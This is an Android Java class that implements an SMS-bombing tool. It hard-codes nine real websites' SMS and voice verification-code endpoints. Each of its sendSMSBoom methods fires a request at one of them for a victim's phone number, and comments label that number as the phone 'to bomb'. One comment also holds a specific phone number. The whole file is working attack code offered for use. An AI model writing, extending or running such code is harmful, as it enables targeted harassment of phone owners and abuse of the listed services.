package com.sherlock.test;

import android.app.Activity;
import android.content.Context;
import android.text.TextUtils;

import com.okhttplib.HttpInfo;
import com.okhttplib.OkHttpUtil;
import com.okhttplib.annotation.Encoding;

/**
 * Created by Sherlock on 2017/10/25.
 */

public class HttpUtils {

    private Activity activity;

    private static String SMS_URL1 = "https://login.10086.cn/sendRandomCodeAction.action?type=01&channelID=12027&userName=";
    private static String SMS_URL2 = "https://www.zhihu.com/send_register_verification_code/sms?captcha_source=register&phone_num=";
    private static String SMS_URL3 = "https://portal.feiyucloud.com/sms/sendSms?districtCode=86&smsType=1&phoneNumber=";
    private static String SMS_URL4 = "https://portal.feiyucloud.com/sms/sendVoice?districtCode=86&smsType=1&phoneNumber=";
    private static String SMS_URL5 = "http://www.lonlife.cn/newUser/code?captcha=pazzb&phone=";
    private static String SMS_URL6 = "https://tg.tdw.cn/ajaxhander/reg.ashx?Action=CheckPhoneIsExist&phoneNumber=";
    private static String SMS_URL7 = "https://www.51mjs" +
            ".com/pc/index/getPhoneValCode?type=1&_"; // =1509021482869&phone=";// 时间戳
    private static String SMS_URL8 = "https://lease.souche" +
            ".com/consumer/v2/consumerapi/sendLoginCaptcha.json?msgType=sms&token=&phone=";
    private static String SMS_URL9 = "https://ldservice.yirendai" +
            ".com/v1/smsCode?callback=jQuery112209981468371891968_";
    // + 1509017907635&mobile=手机号&_=1509017907636";

    /**
     https://login.10086.cn/sendRandomCodeAction.action?userName=要轰炸的手机&type=01&channelID=12027
     https://www.zhihu.com/send_register_verification_code/sms?phone_num=要轰炸的手机&captcha_source=register
     https://portal.feiyucloud.com/sms/sendSms?districtCode=86&phoneNumber=要轰炸的手机&smsType=1
     https://portal.feiyucloud.com/sms/sendVoice?districtCode=86&phoneNumber=要轰炸的手机&smsType=1
     http://www.lonlife.cn/newUser/code?captcha=pazzb&phone=15234222122
     */
    public HttpUtils(Activity activity) {
        this.activity = activity;
    }

    public String sendSMSBoom1(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL1 + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom2(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL2 + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom3(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL3 + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom4(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL4 + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom5(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL5 + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom6(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL6 + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom7(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL7 + System.currentTimeMillis() + "&phone=" + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom8(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                .setUrl(SMS_URL8 + phone)
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }

    public String sendSMSBoom9(String phone) {
        if (TextUtils.isEmpty(phone)) {
            return "";
        }
        final HttpInfo info = HttpInfo.Builder()
                // 1509017907635&mobile=手机号&_=1509017907636
                .setUrl(SMS_URL9 + (System.currentTimeMillis() - 1) + "&mobile=" + phone + "&_="
                        + System.currentTimeMillis())
                .setResponseEncoding(Encoding.UTF_8)//设置该接口的服务器响应编码
                .setRequestEncoding(Encoding.UTF_8)//设置该接口的请求参数编码
                .build();
        OkHttpUtil.getDefault(this)
                .doGetSync(info);
        final String result = info.getRetDetail();
        return result;
    }
}
